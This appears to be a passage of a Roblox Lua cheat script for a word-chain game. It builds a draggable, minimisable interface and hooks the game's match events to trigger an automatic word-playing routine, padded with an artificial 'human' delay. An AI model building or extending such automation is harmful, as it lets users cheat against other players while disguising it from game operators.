        local tween = TweenService:Create(ui.MainWindow, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
            Size = targetSize
        })
        tween:Play()
        
        -- Hide/show content
        ui.ContentContainer.Visible = targetContentVisible
        ui.Tabs.Main.Button.Visible = targetContentVisible
        ui.Tabs.About.Button.Visible = targetContentVisible
    end
end)

-- Close button
closeBtn.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        ui.ScreenGui:Destroy()
    end
end)

-- Drag functionality
local dragging = false
local dragInput
local dragStart
local startPos

local function updateDrag(input)
    local delta = input.Position - dragStart
    ui.MainWindow.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

ui.MainWindow.TitleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = ui.MainWindow.Position
        
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

ui.MainWindow.TitleBar.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        updateDrag(input)
    end
end)

-- Minimize key (Right Shift)
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    
    if input.KeyCode == Enum.KeyCode.RightShift then
        ui.IsMinimized = not ui.IsMinimized
        
        local targetSize = ui.IsMinimized and ui.MinimizedSize or ui.MaximizedSize
        local targetContentVisible = not ui.IsMinimized
        
        local tween = TweenService:Create(ui.MainWindow, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
            Size = targetSize
        })
        tween:Play()
        
        ui.ContentContainer.Visible = targetContentVisible
        ui.Tabs.Main.Button.Visible = targetContentVisible
        ui.Tabs.About.Button.Visible = targetContentVisible
    end
end)

-- =========================
-- UPDATE FUNCTIONS
-- =========================
local function updateOpponentStatus()
    if not uiRefs.opponentParagraph then return end
    
    local content = ""
    if matchActive == true then
        if isMyTurn == true then
            content = "Giliran Anda"
        else
            if opponentStreamWord ~= nil and opponentStreamWord ~= "" then
                content = "Opponent mengetik: " .. tostring(opponentStreamWord)
            else
                content = "Giliran Opponent"
            end
        end
    else
        content = "Match tidak aktif"
    end
    
    uiRefs.opponentParagraph:Set({
        Title = "Status Opponent",
        Content = content
    })
end

local function updateStartLetter()
    if not uiRefs.startLetterParagraph then return end
    
    local content = ""
    if serverLetter ~= nil and serverLetter ~= "" then
        content = "Kata Start: " .. tostring(serverLetter)
    else
        content = "Kata Start: -"
    end
    
    uiRefs.startLetterParagraph:Set({
        Title = "Kata Start",
        Content = content
    })
end

-- =========================
-- REMOTE EVENTS
-- =========================
local function onMatchUI(cmd, value)
    if cmd == "ShowMatchUI" then
        matchActive = true
        isMyTurn = false
        resetUsedWords()

    elseif cmd == "HideMatchUI" then
        matchActive = false
        isMyTurn = false
        serverLetter = ""
        resetUsedWords()

    elseif cmd == "StartTurn" then
        isMyTurn = true
        if autoEnabled then
            startUltraAI()
        end

    elseif cmd == "EndTurn" then
        isMyTurn = false

    elseif cmd == "UpdateServerLetter" then
        serverLetter = value or ""
    end

    updateOpponentStatus()
    updateStartLetter()
end

local function onBillboard(word)
    if matchActive and not isMyTurn then
        opponentStreamWord = word or ""
        updateOpponentStatus()
    end
end

local function onUsedWarn(word)
    if word then
        addUsedWord(word)
        if autoEnabled and matchActive and isMyTurn then
            humanDelay()
            startUltraAI()
        end
    end
end

MatchUI.OnClientEvent:Connect(onMatchUI)
BillboardUpdate.OnClientEvent:Connect(onBillboard)
UsedWordWarn.OnClientEvent:Connect(onUsedWarn)

print("MODERN FLUENT UI LOADED - ANTI DOUBLE WORD ACTIVE")